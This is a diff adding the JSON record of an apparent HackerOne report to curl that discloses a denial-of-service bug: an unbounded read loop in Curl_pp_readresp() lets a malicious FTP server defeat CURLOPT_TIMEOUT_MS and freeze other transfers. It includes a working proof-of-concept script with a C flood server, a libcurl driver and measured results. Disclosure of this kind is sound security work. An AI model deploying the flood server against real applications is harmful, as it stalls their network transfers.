@@ -1,0 +1,109 @@
+{
+  "id": 4022003,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MDIyMDAz",
+  "url": "https://hackerone.com/reports/4022003",
+  "title": "CVE-2026-92387: never-ending loop via server response omission",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "none",
+  "readable_substate": "Resolved",
+  "created_at": "2026-09-11T15:59:57.469Z",
+  "submitted_at": "2026-09-11T15:59:57.637Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "giant_anteater",
+    "url": "/giant_anteater",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/r9sgcvqgyzx7oyd4vqjv580xuk4y/33193aed4df168c753cb4b15e6d5d8d6ba053ba5ee3e8d1478c137162601abe9"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/dd1dfc8fc7352772e4a8994c07e1d628d34edc74db48377c707f10829dc23d53",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/2a499a0b732abf809ef45635d9ad400431480fafd17452e700cbdba6fd64fe85"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2026-92387"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-10-14T07:36:08.553Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-10-14T06:35:28.299Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi all,\n\nI found a way to make a malicious FTP, IMAP, POP3, or SMTP server defeat libcurl's own transfer timeout entirely and, worse, freeze every *other* transfer sharing the same multi handle. All it takes is never sending a final control-response line.\n\n## The bug\n\n`Curl_pp_statemach()` checks the response timeout exactly once, right before it enters the protocol state machine:\n\n```c\n// lib/pingpong.c:70-75\nif(!pp->response_time)\n  pp->response_time = ...;\n...\n```\n\nFrom there, `Curl_pp_readresp()` takes over, and this is the part that doesn't give control back:\n\n```c\n// lib/pingpong.c:252-342\ndo {\n  gotbytes = 0;\n  ...\n  result = pingpong_read(data, sockindex, buffer, sizeof(buffer), &gotbytes);\n  ...\n  result = Curl_dyn_addn(&pp->recvbuf, buffer, gotbytes);\n  ...\n  /* scan for newline-terminated lines, dispatch each to endofresp() */\n} while(gotbytes == sizeof(buffer));\n```\n\nIt reads into a fixed 900-byte buffer, scans for newline-terminated lines, and hands each one to the protocol's `endofresp` callback: for FTP, `ftp_endofresp()`, which only accepts a line as final when it's a real 3-digit reply code followed by a space (the `LASTLINE()` macro); a continuation line like `220-...` never qualifies.\n\nNothing inside this loop calls `Curl_timeleft_ms()`, `Curl_pgrsCheck()`, or imposes any byte or line quota. As long as the peer keeps at least 900 bytes queued, `recv()` keeps returning full reads, the `do/while` keeps re-entering, and the function simply never returns.\n\nThe caller in this PoC sets `CURLOPT_TIMEOUT_MS`, precisely the counter-measure the policy says applications must have, and the loop has no ceiling of its own at all. It keeps going for exactly as long as the peer keeps at least 900 bytes queued, which is a decision entirely in the attacker's hands, not curl's.\n\n## Where it came from\n\nThe unbounded loop is relatively recent. Before the commit [`a5598b6fcb`](https://github.com/curl/curl/commit/a5598b6fcb9ec6b57a7770939a0ffb004456f333) (\"pingpong: drain the input buffer when reading responses\", 2024-08-19, fixes #14201, closes #14597), `Curl_pp_readresp()` read at most once per call: it pulled up to 900 bytes, processed whatever complete lines were already buffered, and returned. Control went back to the caller's dispatch loop every time, which is also where the timeout gets another chance to be checked on the next pass.\n\nThe commit wrapped the whole function in `do { ... } while(gotbytes == sizeof(buffer))` specifically so that data left behind in TLS buffers wouldn't require \"leaving some and expecting to get called again,\" per the commit message. That's a legitimate problem to fix, but the fix removed the one thing standing between a chatty peer and a hung event loop: the natural per-call return point.\n\nStill present at current `main` ([`c0c4971f`](https://github.com/curl/curl/commit/c0c4971fceb41f312065b96be623d24dcc399892), 2026-09-09).\n\n## PoC\n\nTwo handles share one multi handle. Handle A talks FTP to a malicious server with `CURLOPT_TIMEOUT_MS=5000`, and that server either floods non-final `220-...` continuation lines (exploit) or sends one real final line and then goes idle (control). `CURLOPT_CONNECTTIMEOUT_MS` is set well above the test window, so it's the overall-transfer deadline being exercised, not the connect phase.\n\nHandle B is an ordinary HTTP request to a benign server that deliberately delays its response by 300ms, so its answer is sitting ready long before A's flood ends. This isolates whether B's already-available response gets serviced promptly.\n\nBuilt and run against a fresh checkout of the audit revision `e5e1c356107ea4f8208757deb69776d94496cfae` (CMake, `-DCURL_USE_OPENSSL=ON -DHTTP_ONLY=OFF`, everything else default), driving the resulting `libcurl` through the public multi API, unmodified.\n\n```\nprivilege required: NONE beyond ordinary network reachability — the attacker is the FTP server the application connects to\ncheckout: e5e1c356107ea4f8208757deb69776d94496cfae\nbuild:    cmake -S . -B build -DCURL_USE_OPENSSL=ON -DHTTP_ONLY=OFF -DBUILD_SHARED_LIBS=ON \\\n              -DCURL_DISABLE_LDAP=ON -DUSE_NGTCP2=OFF -DUSE_QUICHE=OFF -DUSE_LIBSSH2=OFF \\\n              -DCMAKE_INSTALL_PREFIX=<prefix> && cmake --build build -j4 && cmake --install build\nrun:      sh reproduce.sh exploit\ncontrol:  sh reproduce.sh control\n```\n\n`reproduce.sh` (run with `exploit`, then with `control`; needs `CURL_PREFIX` pointing at the install prefix above):\n\n```sh\n#!/bin/sh\n# Reproduces: a malicious FTP peer that never sends a final control response\n# line defeats CURLOPT_TIMEOUT_MS entirely (Curl_pp_readresp()'s inner loop\n# never checks it), and blocks a second, unrelated, already-answered transfer\n# on the same multi handle from being serviced at all until the flood ends.\n#\n# Handle A: ftp://127.0.0.1:<FTP_PORT>/ with CURLOPT_TIMEOUT_MS=5000, talking\n#           to the flood server. Configured to time out in 5s. Its connect\n#           timeout is set well above that (20s) so the overall transfer\n#           deadline -- not the connect phase -- is what's on test.\n# Handle B: http://127.0.0.1:<HTTP_PORT>/ whose (benign, unmodified) server\n#           answers after a deliberate 300ms delay -- so its response is\n#           sitting ready well before A's flood ends, isolating whether B's\n#           already-available response gets processed promptly or not.\n#\n# exploit: A's server floods non-final \"220-...\\r\\n\" lines for FLOOD_SECONDS\n#          (90s).\n# control: A's server sends one real final \"220 ...\\r\\n\" immediately, then\n#          just holds the connection open (idle) for FLOOD_SECONDS, so the\n#          5s timeout is exercised on an ordinary \"waiting for the next\n#          response\" state instead of the vulnerable non-final-line loop.\nset -e\nMODE=\"$1\"\nCURL_PREFIX=\"${CURL_PREFIX:?set CURL_PREFIX to the built install prefix}\"\nFTP_PORT=\"${VF_FTP_PORT:-32171}\"\nHTTP_PORT=\"${VF_HTTP_PORT:-32172}\"\nFLOOD_SECONDS=\"${VF_FLOOD_SECONDS:-90}\"\nTIMEOUT_MS=\"${VF_TIMEOUT_MS:-5000}\"\nWORK=\"${VF_WORK:-$(mktemp -d)}\"\nmkdir -p \"$WORK\"\n\ncat > \"$WORK/malicious_ftp.c\" <<'EOF'\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <time.h>\n#include <arpa/inet.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <netinet/tcp.h>\n\nint main(int argc, char **argv) {\n  if (argc < 4) { fprintf(stderr, \"usage: %s <port> <exploit|control> <flood_seconds>\\n\", argv[0]); return 2; }\n  int port = atoi(argv[1]);\n  int exploit = strcmp(argv[2], \"exploit\") == 0;\n  double flood_seconds = atof(argv[3]);\n\n  int ls = socket(AF_INET, SOCK_STREAM, 0);\n  int one = 1;\n  setsockopt(ls, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));\n  struct sockaddr_in a; memset(&a, 0, sizeof(a));\n  a.sin_family = AF_INET; a.sin_addr.s_addr = htonl(INADDR_LOOPBACK); a.sin_port = htons((unsigned short)port);\n  if (bind(ls, (struct sockaddr*)&a, sizeof(a)) < 0) { perror(\"bind\"); return 3; }\n  listen(ls, 1);\n  fprintf(stderr, \"[malicious-ftp] listening on %d mode=%s\\n\", port, argv[2]);\n\n  int c = accept(ls, NULL, NULL);\n  if (c < 0) { perror(\"accept\"); return 4; }\n  setsockopt(c, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));\n  int sndbuf = 1 << 20;\n  setsockopt(c, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));\n\n  if (!exploit) {\n    const char *line = \"220 control-mode welcome\\r\\n\";\n    write(c, line, strlen(line));\n    struct timespec ts = { (long)flood_seconds, 0 };\n    nanosleep(&ts, NULL);\n  } else {\n    /* Continuation lines: code 220 followed by '-' at offset 3, never a\n     * final \"220 ...\", per ftp_endofresp()/LASTLINE() in lib/ftp.c. */\n    char chunk[65536];\n    size_t off = 0;\n    while (off + 64 <= sizeof(chunk)) {\n      int n = snprintf(chunk + off, sizeof(chunk) - off,\n                        \"220-still starting up please wait %06zu\\r\\n\", off);\n      off += (size_t)n;\n    }\n    struct timespec start, now;\n    clock_gettime(CLOCK_MONOTONIC, &start);\n    for (;;) {\n      clock_gettime(CLOCK_MONOTONIC, &now);\n      double elapsed = (now.tv_sec - start.tv_sec) + (now.tv_nsec - start.tv_nsec) / 1e9;\n      if (elapsed >= flood_seconds) break;\n      ssize_t w = write(c, chunk, off);\n      if (w < 0) break;\n    }\n    const char *fin = \"220 done flooding\\r\\n\";\n    write(c, fin, strlen(fin));\n  }\n  close(c);\n  close(ls);\n  return 0;\n}\nEOF\n\ncat > \"$WORK/benign_http.py\" <<'PY'\nimport socket, sys, threading, time\nport = int(sys.argv[1]); delay = float(sys.argv[2]) if len(sys.argv) > 2 else 0.0\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\ns.bind((\"127.0.0.1\", port)); s.listen(16)\nprint(f\"[benign-http] listening on {port}, response delay={delay}s\", flush=True)\ndef handle(c):\n    try:\n        c.recv(4096)\n        if delay: time.sleep(delay)\n        body = b\"ok\"\n        resp = (b\"HTTP/1.1 200 OK\\r\\nContent-Length: \" + str(len(body)).encode() +\n                b\"\\r\\nConnection: close\\r\\n\\r\\n\" + body)\n        c.sendall(resp)\n    except Exception: pass\n    finally:\n        try: c.close()\n        except Exception: pass\nwhile True:\n    c, _ = s.accept()\n    threading.Thread(target=handle, args=(c,), daemon=True).start()\nPY\n\ncat > \"$WORK/driver.c\" <<'EOF'\n#include <curl/curl.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/time.h>\n\nstatic size_t sink(char *p, size_t s, size_t n, void *u) { (void)p; (void)u; return s*n; }\nstatic double now_ms(void) {\n  struct timeval tv; gettimeofday(&tv, NULL);\n  return tv.tv_sec * 1000.0 + tv.tv_usec / 1000.0;\n}\n\n/* Handle A (malicious FTP, CURLOPT_TIMEOUT_MS set short) and handle B\n * (benign, deliberately-delayed HTTP) share one multi handle. If A's flood\n * genuinely defeats the timeout check and monopolizes multi_perform()'s\n * per-handle dispatch, B cannot be serviced either -- even though B's\n * server already wrote its response well before A's flood ends. */\nint main(int argc, char **argv) {\n  if (argc < 4) { fprintf(stderr, \"usage: driver <ftp_port> <http_port> <timeout_ms>\\n\"); return 2; }\n  int ftp_port = atoi(argv[1]);\n  int http_port = atoi(argv[2]);\n  long timeout_ms = atol(argv[3]);\n\n  char ftp_url[128], http_url[128];\n  snprintf(ftp_url, sizeof(ftp_url), \"ftp://127.0.0.1:%d/\", ftp_port);\n  snprintf(http_url, sizeof(http_url), \"http://127.0.0.1:%d/\", http_port);\n\n  curl_global_init(CURL_GLOBAL_DEFAULT);\n  CURLM *multi = curl_multi_init();\n\n  CURL *a = curl_easy_init();\n  curl_easy_setopt(a, CURLOPT_URL, ftp_url);\n  curl_easy_setopt(a, CURLOPT_WRITEFUNCTION, sink);\n  curl_easy_setopt(a, CURLOPT_TIMEOUT_MS, timeout_ms);\n  /* Kept well above timeout_ms: FTP's WAIT220/USER exchange is governed by\n   * Curl_pp_state_timeleft_ms(), whose ceiling includes the connect-phase\n   * timeout. Left too low, that (not the overall timeout) is what fires in\n   * the control arm, which would understate what is being demonstrated. */\n  curl_easy_setopt(a, CURLOPT_CONNECTTIMEOUT_MS, 20000L);\n\n  CURL *b = curl_easy_init();\n  curl_easy_setopt(b, CURLOPT_URL, http_url);\n  curl_easy_setopt(b, CURLOPT_WRITEFUNCTION, sink);\n  curl_easy_setopt(b, CURLOPT_TIMEOUT_MS, 20000L);\n  curl_easy_setopt(b, CURLOPT_CONNECTTIMEOUT_MS, 3000L);\n\n  curl_multi_add_handle(multi, a);\n  curl_multi_add_handle(multi, b);\n\n  double t0 = now_ms();\n  double b_done_at = -1, a_done_at = -1;\n  CURLcode a_result = CURLE_OK;\n  int still_running = 1;\n  double watchdog_ms = 100000;\n\n  while (still_running && (now_ms() - t0) < watchdog_ms) {\n    curl_multi_perform(multi, &still_running);\n    int msgq = 0; CURLMsg *m;\n    while ((m = curl_multi_info_read(multi, &msgq))) {\n      if (m->msg == CURLMSG_DONE) {\n        double t = now_ms() - t0;\n        if (m->easy_handle == b && b_done_at < 0) b_done_at = t;\n        if (m->easy_handle == a && a_done_at < 0) { a_done_at = t; a_result = m->data.result; }\n      }\n    }\n    if (still_running) { int numfds = 0; curl_multi_wait(multi, NULL, 0, 100, &numfds); }\n  }\n\n  printf(\"RESULT configured_timeout_ms=%ld a_done_at_ms=%.1f a_result=%d(%s) \"\n         \"b_done_at_ms=%.1f elapsed_ms=%.1f\\n\",\n         timeout_ms, a_done_at, a_result, curl_easy_strerror(a_result),\n         b_done_at, now_ms() - t0);\n\n  curl_multi_remove_handle(multi, a); curl_multi_remove_handle(multi, b);\n  curl_easy_cleanup(a); curl_easy_cleanup(b);\n  curl_multi_cleanup(multi); curl_global_cleanup();\n  return 0;\n}\nEOF\n\ncc -O2 \"$WORK/malicious_ftp.c\" -o \"$WORK/malicious_ftp\"\ncc \"$WORK/driver.c\" -I\"$CURL_PREFIX/include\" -L\"$CURL_PREFIX/lib\" -lcurl \\\n   -Wl,-rpath,\"$CURL_PREFIX/lib\" -o \"$WORK/driver\"\n\n\"$WORK/malicious_ftp\" \"$FTP_PORT\" \"$MODE\" \"$FLOOD_SECONDS\" > \"$WORK/ftp.log\" 2>&1 &\nFTPPID=$!\npython3 \"$WORK/benign_http.py\" \"$HTTP_PORT\" 0.3 > \"$WORK/http.log\" 2>&1 &\nHTTPPID=$!\nsleep 0.4\n\n\"$WORK/driver\" \"$FTP_PORT\" \"$HTTP_PORT\" \"$TIMEOUT_MS\"\n\nkill \"$FTPPID\" \"$HTTPPID\" 2>/dev/null || true\nwait \"$FTPPID\" \"$HTTPPID\" 2>/dev/null || true\n```\n\nMeasured results (audit revision, `CURLOPT_TIMEOUT_MS=5000`, 90-second flood window):\n\n```\nexploit: RESULT configured_timeout_ms=5000 a_done_at_ms=90005.0 a_result=28(Timeout was reached) b_done_at_ms=90005.0 elapsed_ms=90005.0\ncontrol: RESULT configured_timeout_ms=5000 a_done_at_ms=5002.0  a_result=28(Timeout was reached) b_done_at_ms=306.1 elapsed_ms=5002.0\n```\n\nIn `control` mode, where the peer sends one real final line immediately, the 5000ms deadline fires exactly on schedule (`a_done_at_ms=5002.0`), and B (already answered by roughly 300ms) completes promptly right after (`b_done_at_ms=306.1`).\n\nIn `exploit` mode, the same deadline isn't enforced at all: A only finishes when the 90-second flood itself stops (`a_done_at_ms=90005.0`, 18x past its configured deadline). B, whose server had already written its response by roughly 300ms in, isn't serviced either until that same instant, 89.7 seconds after it was ready. One malicious peer, by never sending a final line, held the entire multi handle's dispatch loop hostage for the whole flood duration.\n\n## Suggested direction\n\nBound the work done per `Curl_pp_readresp()` invocation: limit the reads, bytes, or lines consumed per call, and return to the caller regardless of whether the buffer keeps filling. Also call `Curl_pgrsCheck()` and consult `Curl_pp_state_timeleft_ms()` inside the repeated-read loop itself, not only in `Curl_pp_statemach()` before the loop is entered, so an always-readable peer can't prevent the configured response and overall deadlines from ever being checked, for itself and for every other transfer sharing the multi handle.\n\nCheers,\nJosh\n\n## Impact\n\nThis gives any contacted FTP/IMAP/POP3/SMTP server a process-level denial-of-service primitive against applications that share one multi handle (or one thread driving it) across transfers to different destinations. A single malicious server the application merely asked a question of can freeze every other in-flight transfer on that event loop, indefinitely, regardless of what timeout those other transfers were configured with.\n\nPreconditions:\n- An application using FTP, IMAP, POP3, or SMTP alongside other transfers on the same multi handle\n- `CURLOPT_TIMEOUT_MS`/`--max-time` configured on the targeted transfer (the counter-measure curl's own security policy expects the caller to have)\n- A server willing to keep the control connection readable without ever sending a final response line",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 0,
+  "voters": [],
+  "severity": {
+    "rating": "none",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
